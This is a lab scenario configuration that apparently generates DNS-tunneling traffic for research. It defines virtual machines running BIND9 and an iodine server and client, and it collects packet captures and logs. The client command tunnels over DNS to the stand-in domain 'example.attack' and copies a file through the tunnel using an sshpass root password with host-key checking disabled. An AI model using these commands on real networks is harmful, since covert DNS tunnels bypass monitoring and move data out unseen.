execution_time: 2022-03-30 14:31:37.330546

variables: {"record_type": "srv", "encoding": "base64", "passphrase": "0xDEADBEEF"}

scenario: {"name": "DNS Tunnel Scenario", "description": "\"This Scenario runs through multiple DNS tunneling \"\n", "provisioner": "vagrant", "use_default_templates": true, "components": [{"name": "BIND9", "ipv4_address": "192.168.0.10", "description": "Installation of BIND9 DNS server.", "image": "ubuntu/focal64", "setup": {"type": "ansible", "val": "bind9_playbook"}, "run": {"type": "shell", "val": "systemctl restart named"}, "artifacts_to_collect": [{"type": "pcap", "val": ["tcpdump -i any -s 0 -n -w /tmp/dns.pcap port 53"]}, {"type": "files", "val": ["/var/cache/bind/query*.log", "/tmp/filebeat.json*", "/tmp/dns.pcap"]}, {"type": "elastic", "val": ["192.168.1.248:9200"]}, {"type": "filebeat", "val": ["/var/cache/bind/query*.log"]}]}, {"name": "iodine_server", "ipv4_address": "192.168.0.20", "description": "This sets up the IODINE server.", "image": "ubuntu/focal64", "setup": {"type": "ansible", "val": "iodine_server_setup"}, "run": {"type": "shell", "val": "nohup asciinema rec /tmp/iodine_server_srv_base64_0xDEADBEEF.cast -c \\'set -x; iodined -4 -c -f 10.0.0.1 example.attack -P 0xDEADBEEF & sleep 1\\'"}, "artifacts_to_collect": [{"type": "files", "val": ["/tmp/*.cast"]}]}, {"name": "iodine_client", "ipv4_address": "192.168.0.30", "description": "This sets up the IODINE client.", "image": "ubuntu/focal64", "setup": {"type": "script", "val": "iodine_client_setup.bash"}, "run": {"type": "shell", "val": "set -x; (iodine -4 -f -P 0xDEADBEEF -Tsrv -Obase64 -r 192.168.0.10 example.attack) & sleep 20; rsync -P --rsh=\"sshpass -p root ssh -l root -oStrictHostKeyChecking=no\" 10.0.0.1:/root/test-file /tmp/"}, "artifacts_to_collect": [{"type": "files", "val": ["/tmp/*.cast"]}, {"type": "cli_recording", "val": ["/tmp/iodine_client_srv_base64_0xDEADBEEF.cast"]}], "depends_on": ["dns_attack_server", "dns_server"]}]}

